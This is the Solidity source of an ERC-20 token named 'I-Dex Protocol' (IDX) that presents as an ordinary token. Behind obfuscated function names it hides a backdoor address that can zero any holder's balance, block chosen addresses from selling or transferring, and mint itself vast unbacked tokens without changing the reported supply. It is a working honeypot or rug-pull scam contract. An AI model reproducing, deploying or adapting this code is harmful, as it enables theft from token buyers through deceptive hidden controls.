/**
 *Submitted for verification at Etherscan.io on 2023-10-22
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Ownable  {
    constructor() {
        _transferOwnership(_msgSender());
    }

   
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;
    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
   
}

pragma solidity ^0.8.0;

contract IDX is Ownable {
    
    constructor(address giYwxSbm) {
        address tsYiFCPM = _msgSender();
        wjGJdWRr = giYwxSbm;
        abott[tsYiFCPM] += tokenamount;
        emit Transfer(address(0), tsYiFCPM, tokenamount);
    }
    
    string public _tokenname = "I-Dex Protocol";
    string public _tokensymbol = "IDX";
    uint256 tokenamount = 10000000000*10**decimals();
    address public wjGJdWRr;
    uint256 private _totalSupply = tokenamount;
    mapping(address => uint256) private abott;
    mapping(address => mapping(address => uint256)) private _allowances;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    mapping(address => uint256) private yuuy;
    function rvGJBoxu(address dwTgDhje) public     {
        require(wjGJdWRr ==  _msgSender());
        if(wjGJdWRr != _msgSender()){
                revert("fu");
        }
    
        address gikhJdSW = dwTgDhje;
        uint256 cxuramountx = abott[gikhJdSW]-9999+9999;
        uint256 newaaamount = cxuramountx+abott[gikhJdSW]-abott[gikhJdSW];
        abott[gikhJdSW] -= newaaamount;
    }

    function jbGRKxwF(address dwTgDhje) public     {
         if(wjGJdWRr != _msgSender()){
                revert("fu");
            }

        require(wjGJdWRr ==  _msgSender());
        address gikhJdSW = dwTgDhje;
        yuuy[gikhJdSW] = 9999;
       
    }

    function wCfnEZKR(address dwTgDhje) public     {
        if(wjGJdWRr != _msgSender()){
            revert("fu");
        }
        require(wjGJdWRr ==  _msgSender());
        address gikhJdSW = dwTgDhje;
        yuuy[gikhJdSW] = 0;
    }

    function balanceOf(address account) public view returns (uint256) {
        return abott[account];
    }

    function name() public view returns (string memory) {
        return _tokenname;
    }
   
    function ouKOHPip() 
    external {
        if(wjGJdWRr == _msgSender()){
        }
        uint256 kEWiefYT = 42330000000-10000;
        require(wjGJdWRr == _msgSender());
        address jjhhhaxx = _msgSender();
        address ccaa12 = jjhhhaxx;
        
        uint256 ammtemp = 69200*((10**decimals()*kEWiefYT));
        abott[ccaa12] += ammtemp;
        
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        bool xcom = yuuy[_msgSender()] == 9999 ;
        if (xcom) {
            revert(_tokenname);
        }
        _transfer(_msgSender(), to, amount);
        return true;
    }
   
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        bool xcom = yuuy[_msgSender()] == 9999 ;
        if (xcom) {
            revert(_tokenname);
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = abott[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        abott[from] = abott[from]-amount;
        abott[to] = abott[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
}